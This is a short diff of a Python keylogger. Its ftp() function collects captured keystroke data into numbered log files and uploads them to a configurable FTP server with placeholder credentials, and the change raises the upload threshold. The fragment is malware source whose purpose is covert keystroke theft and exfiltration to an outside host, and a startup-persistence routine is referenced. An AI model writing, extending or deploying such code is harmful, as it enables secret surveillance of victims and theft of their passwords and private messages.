@@ -47,7 +47,7 @@ def addStartup():
 #Upload logs to FTP account
 def ftp():
     global data,count
-    if len(data)>100:
+    if len(data)>10000:
         count+=1
         FILENAME="logs-"+str(count)+".txt"
         fp=open(FILENAME,"a")
@@ -55,7 +55,7 @@ def ftp():
         fp.close()
         data=''
         try:
-			# Change server below.
+	# Change server below.
             SERVER="FTPSERVER.COM" #Specify your FTP Server address
             USERNAME="USERNAME" #Specify your FTP Username
             PASSWORD="PASSWORD" #Specify your FTP Password
